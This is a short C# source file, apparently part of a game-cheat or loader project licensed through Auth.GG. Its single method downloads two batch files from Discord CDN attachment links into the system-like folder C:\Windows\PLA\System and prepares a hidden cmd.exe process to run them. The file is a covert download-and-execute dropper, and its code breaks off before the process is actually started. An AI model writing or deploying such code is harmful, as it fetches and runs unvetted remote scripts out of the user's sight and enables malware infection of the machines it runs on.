using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Threading;


namespace Auth.GG_Example
{
    class bat2
    {

        public static void Launcher2()
        {
            WebClient Client = new WebClient();
            string text = @"C:\Windows\PLA\System\Launch pass.bat";
            string text1 = @"C:\Windows\PLA\System\launch subti.bat";

            Client.DownloadFile("https://cdn.discordapp.com/attachments/855087379878248479/855530380106399764/Launch_pass.bat", text);
            Client.DownloadFile("https://cdn.discordapp.com/attachments/855087379878248479/855530381116702781/launch_subti.bat", text1);


            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;













        }
    }

}

